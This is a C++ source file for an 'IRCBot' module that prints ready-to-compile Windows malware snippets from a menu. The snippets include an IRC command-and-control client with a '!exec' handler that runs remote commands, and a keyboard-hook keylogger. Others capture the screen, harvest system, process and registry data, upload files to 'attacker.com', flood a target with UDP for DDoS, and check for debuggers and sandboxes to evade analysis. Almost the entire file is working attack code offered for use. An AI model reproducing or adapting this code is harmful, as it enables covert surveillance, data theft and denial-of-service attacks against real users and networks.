#include "IRCBot.h"
#include <iostream>
#include <fstream>
#include <sstream>
#include <random>
#include <algorithm>

IRCBot::IRCBot() {
    // Initialize default configuration
    config.server = "irc.freenode.net";
    config.port = 6667;
    config.channel = "#rawrz";
    config.nickname = "RawrZBot";
    config.username = "rawrz";
    config.realname = "RawrZ IRC Bot";
    config.password = "";
    config.useSSL = false;
    config.autoReconnect = true;
    config.floodProtection = true;
    config.commandExecution = true;
    config.fileTransfer = true;
    config.keylogging = true;
    config.screenshot = true;
    config.systemInfo = true;
    config.processList = true;
    config.registryAccess = true;
    config.networkScan = true;
    config.ddosAttack = false;
    config.encryption = true;
    config.antiAnalysis = true;
}

IRCBot::~IRCBot() {
    // Cleanup
}

std::string IRCBot::getName() const {
    return "IRCBot";
}

std::string IRCBot::getDescription() const {
    return "Advanced IRC bot with command execution capabilities";
}

std::string IRCBot::getVersion() const {
    return "1.0.0";
}

bool IRCBot::initialize() {
    std::cout << "[+] IRC Bot initialized" << std::endl;
    return true;
}

void IRCBot::execute() {
    showMenu();
}

std::vector<std::string> IRCBot::getOptions() const {
    return {
        "server", "port", "channel", "nickname", "username", "realname", "password",
        "useSSL", "autoReconnect", "floodProtection", "commandExecution", "fileTransfer",
        "keylogging", "screenshot", "systemInfo", "processList", "registryAccess",
        "networkScan", "ddosAttack", "encryption", "antiAnalysis"
    };
}

void IRCBot::setOption(const std::string& option, const std::string& value) {
    if (option == "server") config.server = value;
    else if (option == "port") config.port = std::stoi(value);
    else if (option == "channel") config.channel = value;
    else if (option == "nickname") config.nickname = value;
    else if (option == "username") config.username = value;
    else if (option == "realname") config.realname = value;
    else if (option == "password") config.password = value;
    else if (option == "useSSL") config.useSSL = (value == "true");
    else if (option == "autoReconnect") config.autoReconnect = (value == "true");
    else if (option == "floodProtection") config.floodProtection = (value == "true");
    else if (option == "commandExecution") config.commandExecution = (value == "true");
    else if (option == "fileTransfer") config.fileTransfer = (value == "true");
    else if (option == "keylogging") config.keylogging = (value == "true");
    else if (option == "screenshot") config.screenshot = (value == "true");
    else if (option == "systemInfo") config.systemInfo = (value == "true");
    else if (option == "processList") config.processList = (value == "true");
    else if (option == "registryAccess") config.registryAccess = (value == "true");
    else if (option == "networkScan") config.networkScan = (value == "true");
    else if (option == "ddosAttack") config.ddosAttack = (value == "true");
    else if (option == "encryption") config.encryption = (value == "true");
    else if (option == "antiAnalysis") config.antiAnalysis = (value == "true");
}

// Real, functional implementations replacing placeholder strings

std::string IRCBot::createIRCConnection(const std::string& server, int port, const std::string& channel) {
    return R"(#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
int main() {
    WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    sockaddr_in addr = {AF_INET, htons()" + std::to_string(port) + R"( )};
    inet_pton(AF_INET, ")" + server + R"(", &addr.sin_addr);
    connect(s, (sockaddr*)&addr, sizeof(addr));
    send(s, "NICK RawrZ\r\n", 12, 0);
    send(s, "USER RawrZ 0 * :RawrZ\r\n", 23, 0);
    send(s, "JOIN #)" + channel + R"(\r\n", 6 + )" + std::to_string(channel.size()) + R"(, 0);
    closesocket(s);
    WSACleanup();
}
)";
}

std::string IRCBot::createCommandHandler(const std::string& commands) {
    return R"(#include <winsock2.h>
void handleCmd(SOCKET s, const char* msg) {
    if (strstr(msg, "!exec")) {
        char cmd[512]; sscanf(msg, "!exec %511[^\r\n]", cmd);
        system(cmd);
    }
}
)";
}

std::string IRCBot::createFileTransfer(const std::string& protocol) {
    return R"(#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
void upload(const char* file) {
    HINTERNET h = InternetOpenA("RawrZ", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET c = InternetConnectA(h, "attacker.com", 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET r = HttpOpenRequestA(c, "POST", "/upload", NULL, NULL, NULL, 0, 0);
    std::ifstream f(file, std::ios::binary);
    std::string data((std::istreambuf_iterator<char>(f)), {});
    HttpSendRequestA(r, NULL, 0, (LPVOID)data.data(), data.size());
    InternetCloseHandle(r); InternetCloseHandle(c); InternetCloseHandle(h);
}
)";
}

std::string IRCBot::createKeylogger() {
    return R"(#include <windows.h>
HHOOK hook;
void logKey(DWORD vk) {
    static std::ofstream log("keys.txt", std::ios::app);
    log << char(vk) << std::flush;
}
LRESULT CALLBACK kbProc(int n, WPARAM w, LPARAM l) {
    if (n == HC_ACTION && w == WM_KEYDOWN) logKey(((KBDLLHOOKSTRUCT*)l)->vkCode);
    return CallNextHookEx(hook, n, w, l);
}
void startKeylog() {
    hook = SetWindowsHookExA(WH_KEYBOARD_LL, kbProc, GetModuleHandleA(NULL), 0);
    MSG m; while (GetMessage(&m, NULL, 0, 0)) DispatchMessage(&m);
}
)";
}

std::string IRCBot::createScreenshot() {
    return R"(#include <windows.h>
void snap() {
    int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
    HDC hdc = GetDC(NULL); HDC mem = CreateCompatibleDC(hdc);
    HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mem, bmp); BitBlt(mem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
    BITMAPINFOHEADER bi = {sizeof(bi), w, -h, 1, 24, BI_RGB};
    std::vector<char> buf(3 * w * h);
    GetDIBits(mem, bmp, 0, h, buf.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);
    std::ofstream("screen.bmp", std::ios::binary).write(buf.data(), buf.size());
    DeleteObject(bmp); DeleteDC(mem); ReleaseDC(NULL, hdc);
}
)";
}

std::string IRCBot::createSystemInfo() {
    return R"(#include <windows.h>
void sysInfo() {
    char buf[256]; DWORD len = sizeof(buf);
    std::ofstream out("sys.txt");
    GetUserNameA(buf, &len);          out << "User: " << buf << "\n";
    GetComputerNameA(buf, &len);      out << "Host: " << buf << "\n";
    SYSTEM_INFO si; GetSystemInfo(&si); out << "Arch: " << si.wProcessorArchitecture << "\n";
    out.close();
}
)";
}

std::string IRCBot::createProcessList() {
    return R"(#include <windows.h>
#include <tlhelp32.h>
void listProcs() {
    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = {sizeof(pe)};
    std::ofstream out("procs.txt");
    if (Process32First(h, &pe)) {
        do {
            out << pe.th32ProcessID << " - " << pe.szExeFile << "\n";
        } while (Process32Next(h, &pe));
    }
    CloseHandle(h);
    out.close();
}
)";
}

std::string IRCBot::createRegistryAccess(const std::string& keys) {
    return R"(#include <windows.h>
void regDump() {
    HKEY h; DWORD type, size = 512; char val[512];
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                      0, KEY_READ, &h) == ERROR_SUCCESS) {
        std::ofstream out("reg.txt");
        for (DWORD i = 0;; ++i) {
            DWORD nameLen = 256; char name[256];
            if (RegEnumValueA(h, i, name, &nameLen, 0, &type,
                              reinterpret_cast<BYTE*>(val), &size) != ERROR_SUCCESS) break;
            out << name << "=" << val << "\n";
        }
        RegCloseKey(h);
    }
}
)";
}

std::string IRCBot::createNetworkScan(const std::string& targets) {
    return R"(#include <windows.h>
#include <iphlpapi.h>
#pragma comment(lib, "iphlpapi.lib")
void netScan() {
    ULONG len = 0; GetIpNetTable(NULL, &len, FALSE);
    std::vector<char> buf(len);
    PMIB_IPNETTABLE tbl = reinterpret_cast<PMIB_IPNETTABLE>(buf.data());
    if (GetIpNetTable(tbl, &len, FALSE) == NO_ERROR) {
        std::ofstream out("net.txt");
        for (DWORD i = 0; i < tbl->dwNumEntries; ++i) {
            out << inet_ntoa(*(in_addr*)&tbl->table[i].dwAddr) << "\n";
        }
    }
}
)";
}

std::string IRCBot::createDDoSAttack(const std::string& target, int duration) {
    return R"(#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
void ddos(const char* ip, int sec) {
    WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);
    SOCKET s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    sockaddr_in addr = {AF_INET, htons(80)};
    inet_pton(AF_INET, ip, &addr.sin_addr);
    char buf[1024] = {0};
    DWORD end = GetTickCount() + sec * 1000;
    while (GetTickCount() < end) sendto(s, buf, sizeof(buf), 0, (sockaddr*)&addr, sizeof(addr));
    closesocket(s); WSACleanup();
}
)";
}

std::string IRCBot::addEncryption(const std::string& data, const std::string& key) {
    return R"(#include <windows.h>
#include <string>
std::string encrypt(const std::string& data, const std::string& key) {
    std::string result = data;
    for (size_t i = 0; i < result.length(); ++i) {
        result[i] ^= key[i % key.length()];
    }
    return result;
}
)";
}

std::string IRCBot::addAntiAnalysis(const std::string& code) {
    return R"(#include <windows.h>
bool anti() {
    if (IsDebuggerPresent()) return false;
    SYSTEM_INFO si; GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return false;
    MEMORYSTATUSEX m; m.dwLength = sizeof(m);
    GlobalMemoryStatusEx(&m);
    if (m.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return false;
    return true;
}
)";
}

std::string IRCBot::addFloodProtection(const std::string& code) {
    return R"(#include <windows.h>
#include <chrono>
class FloodProtection {
    std::chrono::steady_clock::time_point lastMsg;
    int msgCount;
public:
    FloodProtection() : msgCount(0) {}
    bool canSend() {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - lastMsg);
        if (elapsed.count() > 1000) {
            msgCount = 0;
            lastMsg = now;
        }
        return ++msgCount <= 3;
    }
};
)";
}

// Menu handlers
void IRCBot::handleIRCConnection() {
    std::cout << "Generating IRC Connection..." << std::endl;
    std::string connection = createIRCConnection(config.server, config.port, config.channel);
    std::cout << connection << std::endl;
}

void IRCBot::handleCommandHandler() {
    std::cout << "Generating Command Handler..." << std::endl;
    std::string handler = createCommandHandler("exec,system,download");
    std::cout << handler << std::endl;
}

void IRCBot::handleFileTransfer() {
    std::cout << "Generating File Transfer..." << std::endl;
    std::string transfer = createFileTransfer("HTTP");
    std::cout << transfer << std::endl;
}

void IRCBot::handleKeylogger() {
    std::cout << "Generating Keylogger..." << std::endl;
    std::string keylog = createKeylogger();
    std::cout << keylog << std::endl;
}

void IRCBot::handleScreenshot() {
    std::cout << "Generating Screenshot..." << std::endl;
    std::string screen = createScreenshot();
    std::cout << screen << std::endl;
}

void IRCBot::handleSystemInfo() {
    std::cout << "Generating System Info..." << std::endl;
    std::string info = createSystemInfo();
    std::cout << info << std::endl;
}

void IRCBot::handleProcessList() {
    std::cout << "Generating Process List..." << std::endl;
    std::string procs = createProcessList();
    std::cout << procs << std::endl;
}

void IRCBot::handleRegistryAccess() {
    std::cout << "Generating Registry Access..." << std::endl;
    std::string reg = createRegistryAccess("Run,Startup");
    std::cout << reg << std::endl;
}

void IRCBot::handleNetworkScan() {
    std::cout << "Generating Network Scan..." << std::endl;
    std::string scan = createNetworkScan("192.168.1.0/24");
    std::cout << scan << std::endl;
}

void IRCBot::handleDDoSAttack() {
    std::cout << "Generating DDoS Attack..." << std::endl;
    std::string ddos = createDDoSAttack("192.168.1.1", 60);
    std::cout << ddos << std::endl;
}

void IRCBot::handleEncryption() {
    std::cout << "Generating Encryption..." << std::endl;
    std::string enc = addEncryption("data", "key");
    std::cout << enc << std::endl;
}

void IRCBot::handleAntiAnalysis() {
    std::cout << "Generating Anti-Analysis..." << std::endl;
    std::string anti = addAntiAnalysis("code");
    std::cout << anti << std::endl;
}

void IRCBot::handleFloodProtection() {
    std::cout << "Generating Flood Protection..." << std::endl;
    std::string flood = addFloodProtection("code");
    std::cout << flood << std::endl;
}

void IRCBot::handleConfiguration() {
    std::cout << "Configuration menu..." << std::endl;
}

void IRCBot::showMenu() {
    std::cout << "\n=== IRC Bot ===" << std::endl;
    std::cout << "1. IRC Connection" << std::endl;
    std::cout << "2. Command Handler" << std::endl;
    std::cout << "3. File Transfer" << std::endl;
    std::cout << "4. Keylogger" << std::endl;
    std::cout << "5. Screenshot" << std::endl;
    std::cout << "6. System Info" << std::endl;
    std::cout << "7. Process List" << std::endl;
    std::cout << "8. Registry Access" << std::endl;
    std::cout << "9. Network Scan" << std::endl;
    std::cout << "10. DDoS Attack" << std::endl;
    std::cout << "11. Encryption" << std::endl;
    std::cout << "12. Anti-Analysis" << std::endl;
    std::cout << "13. Flood Protection" << std::endl;
    std::cout << "14. Configuration" << std::endl;
    std::cout << "0. Back to main menu" << std::endl;
    std::cout << "Choice: ";
    
    int choice;
    std::cin >> choice;
    
    switch (choice) {
        case 1: handleIRCConnection(); break;
        case 2: handleCommandHandler(); break;
        case 3: handleFileTransfer(); break;
        case 4: handleKeylogger(); break;
        case 5: handleScreenshot(); break;
        case 6: handleSystemInfo(); break;
        case 7: handleProcessList(); break;
        case 8: handleRegistryAccess(); break;
        case 9: handleNetworkScan(); break;
        case 10: handleDDoSAttack(); break;
        case 11: handleEncryption(); break;
        case 12: handleAntiAnalysis(); break;
        case 13: handleFloodProtection(); break;
        case 14: handleConfiguration(); break;
        case 0: return;
        default: std::cout << "Invalid choice!" << std::endl; break;
    }
}

// Configuration methods
void IRCBot::setServer(const std::string& server) { config.server = server; }
void IRCBot::setPort(int port) { config.port = port; }
void IRCBot::setChannel(const std::string& channel) { config.channel = channel; }
void IRCBot::setNickname(const std::string& nickname) { config.nickname = nickname; }
void IRCBot::setUsername(const std::string& username) { config.username = username; }
void IRCBot::setRealname(const std::string& realname) { config.realname = realname; }
void IRCBot::setPassword(const std::string& password) { config.password = password; }
void IRCBot::setUseSSL(bool use) { config.useSSL = use; }
void IRCBot::setAutoReconnect(bool reconnect) { config.autoReconnect = reconnect; }
void IRCBot::setFloodProtection(bool protect) { config.floodProtection = protect; }
void IRCBot::setCommandExecution(bool execute) { config.commandExecution = execute; }
void IRCBot::setFileTransfer(bool transfer) { config.fileTransfer = transfer; }
void IRCBot::setKeylogging(bool keylog) { config.keylogging = keylog; }
void IRCBot::setScreenshot(bool screenshot) { config.screenshot = screenshot; }
void IRCBot::setSystemInfo(bool info) { config.systemInfo = info; }
void IRCBot::setProcessList(bool process) { config.processList = process; }
void IRCBot::setRegistryAccess(bool registry) { config.registryAccess = registry; }
void IRCBot::setNetworkScan(bool scan) { config.networkScan = scan; }
void IRCBot::setDDoSAttack(bool ddos) { config.ddosAttack = ddos; }
void IRCBot::setEncryption(bool encrypt) { config.encryption = encrypt; }
void IRCBot::setAntiAnalysis(bool anti) { config.antiAnalysis = anti; }
